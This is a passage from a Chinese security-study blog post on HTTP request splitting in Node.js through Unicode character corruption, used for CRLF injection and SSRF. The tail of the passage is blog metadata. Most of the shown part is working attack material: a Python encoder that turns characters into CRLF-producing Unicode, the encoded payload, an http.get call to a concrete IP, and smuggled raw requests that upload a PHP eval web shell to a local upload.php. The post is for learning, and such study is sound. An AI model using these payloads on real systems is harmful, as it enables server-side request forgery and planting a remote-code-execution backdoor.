name=&quot;Upload&quot;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Upload</span></span><br><span class=\"line\"><span class=\"string\">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">GET / HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">test:&#x27;&#x27;&#x27;</span>.replace(<span class=\"string\">&quot;\\n&quot;</span>,<span class=\"string\">&quot;\\r\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">payload_encode</span>(<span class=\"params\">raw</span>):</span><br><span class=\"line\">    ret = <span class=\"string\">u&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> raw:</span><br><span class=\"line\">        ret += <span class=\"built_in\">chr</span>(<span class=\"number\">0x0100</span>+<span class=\"built_in\">ord</span>(i))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret</span><br><span class=\"line\"></span><br><span class=\"line\">payload = payload_encode(payload)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输出: ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ</span></span><br></pre></td></tr></table></figure>\n\n<p>构造请求：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; http.<span class=\"title function_ invoke__\">get</span>(<span class=\"string\">&#x27;http://47.101.57.72:4000/ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t01aac9eb365660564a.png\" alt=\"img\"></p>\n<p>如上图所示，成功构造出了一个文件上传的POST请求，像这样的POST请求可以被我们用于 SSRF。下面我们分析一下整个攻击的过程。</p>\n<p>原始请求数据如下：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>47.101.57.72:4000</span><br></pre></td></tr></table></figure>\n\n<p>当我们插入CRLF数据后，HTTP请求数据变成了：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-php\">POST /upload.php HTTP/<span class=\"number\">1.1</span></span></span><br><span class=\"line\"><span class=\"language-php\">Host: <span class=\"number\">127.0</span>.<span class=\"number\">0.1</span></span></span><br><span class=\"line\"><span class=\"language-php\">Content-Length: <span class=\"number\">437</span></span></span><br><span class=\"line\"><span class=\"language-php\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class=\"line\"><span class=\"language-php\">......</span></span><br><span class=\"line\"><span class=\"language-php\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;whoami&quot;</span>]);<span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"language-php\">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class=\"line\"><span class=\"language-php\">Content-Disposition: form-data; name=<span class=\"string\">&quot;Upload&quot;</span></span></span><br><span class=\"line\"><span class=\"language-php\"></span></span><br><span class=\"line\"><span class=\"language-php\">Upload</span></span><br><span class=\"line\"><span class=\"language-php\">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class=\"line\"><span class=\"language-php\"></span></span><br><span class=\"line\"><span class=\"language-php\"> HTTP/<span class=\"number\">1.1</span></span></span><br><span class=\"line\"><span class=\"language-php\">Host: <span class=\"number\">47.101</span>.<span class=\"number\">57.72</span>:<span class=\"number\">4000</span></span></span><br></pre></td></tr></table></figure>\n\n<p>上次请求包的Host字段和状态行中的 <code>HTTP/1.1</code> 就单独出来了，所以我们再构造一个请求把他闭合：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-php\">POST /upload.php HTTP/<span class=\"number\">1.1</span></span></span><br><span class=\"line\"><span class=\"language-php\">Host: <span class=\"number\">127.0</span>.<span class=\"number\">0.1</span></span></span><br><span class=\"line\"><span class=\"language-php\">Content-Length: <span class=\"number\">437</span></span></span><br><span class=\"line\"><span class=\"language-php\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class=\"line\"><span class=\"language-php\">......</span></span><br><span class=\"line\"><span class=\"language-php\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;whoami&quot;</span>]);<span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"language-php\">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class=\"line\"><span class=\"language-php\">Content-Disposition: form-data; name=<span class=\"string\">&quot;Upload&quot;</span></span></span><br><span class=\"line\"><span class=\"language-php\"></span></span><br><span class=\"line\"><span class=\"language-php\">Upload</span></span><br><span class=\"line\"><span class=\"language-php\">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class=\"line\"><span class=\"language-php\"></span></span><br><span class=\"line\"><span class=\"language-php\">GET / HTTP/<span class=\"number\">1.1</span></span></span><br><span class=\"line\"><span class=\"language-php\">test: HTTP/<span class=\"number\">1.1</span></span></span><br><span class=\"line\"><span class=\"language-php\">Host: <span class=\"number\">47.101</span>.<span class=\"number\">57.72</span>:<span class=\"number\">4000</span></span></span><br></pre></td></tr></table></figure>\n\n","text":"总结学习一下，重点把拆分攻击学习记忆一下，原型链污染单独开一篇写 res.render()res.render()是 Node.js 中的一个方法，它可以渲染视...","permalink":"/post/nodejs(拆分攻击)","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"js","slug":"js","count":3,"path":"api/tags/js.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#res-render\"><span class=\"toc-text\">res.render()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%87%8D%E5%AE%9A%E5%90%91%E6%A6%82%E5%BF%B5\"><span class=\"toc-text\">重定向概念</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#res-location\"><span class=\"toc-text\">res.location()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#res-redirect\"><span class=\"toc-text\">res.redirect</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#delimiter\"><span class=\"toc-text\">delimiter</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Custom-delimiters\"><span class=\"toc-text\">Custom delimiters</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#NodeJS-%E4%B8%AD%E7%9A%84-CRLF-SSRF-Injection\"><span class=\"toc-text\">NodeJS 中的 CRLF&#x2F;SSRF Injection</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#HTTP-%E8%AF%B7%E6%B1%82%E8%B7%AF%E5%BE%84%E4%B8%AD%E7%9A%84-Unicode-%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F\"><span class=\"toc-text\">HTTP 请求路径中的 Unicode 字符损坏</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Unicode-%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F%E9%80%A0%E6%88%90%E7%9A%84-HTTP-%E6%8B%86%E5%88%86%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">Unicode 字符损坏造成的 HTTP 拆分攻击</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9C%A8-HTTP-%E7%8A%B6%E6%80%81%E8%A1%8C%E6%B3%A8%E5%85%A5%E6%81%B6%E6%84%8F%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5\"><span class=\"toc-text\">在 HTTP 状态行注入恶意首部字段</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9C%A8-HTTP-%E7%8A%B6%E6%80%81%E8%A1%8C%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4-HTTP-%E8%AF%B7%E6%B1%82\"><span class=\"toc-text\">在 HTTP 状态行注入完整 HTTP 请求</span></a></li></ol></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Interesting Game wp","uid":"eb3e8dc673fc9bb8b7949a865517e770","slug":"Interesting-Game-wp","date":"2023-04-07T15:00:24.533Z","updated":"2023-08-06T07:54:05.827Z","comments":true,"path":"api/articles/Interesting-Game-wp.json","keywords":null,"cover":"/img/13.jpg","text":"todo上的一些题目 XCTF FINAL 2021warmupcms 附件的docker和题目除了flag以外完全一样，建议先本地打通再打远程。需要去后台正确...","permalink":"/post/Interesting-Game-wp","photos":[],"count_time":{"symbolsCount":612,"symbolsTime":"1 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Cyber Apocalypse 2023 wp","uid":"c877094afea6970d987e778fa3ed5361","slug":"2023Cyber-Apocalypse","date":"2023-03-25T06:57:02.412Z","updated":"2023-08-06T08:02:43.103Z","comments":true,"path":"api/articles/2023Cyber-Apocalypse.json","keywords":null,"cover":"/img/48.jpg","text":"前面几道题太基础，主要记录后面几道题目 Orbital In order to decipher the alien communication that he...","permalink":"/post/2023Cyber-Apocalypse","photos":[],"count_time":{"symbolsCount":"1.9k","symbolsTime":"2 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}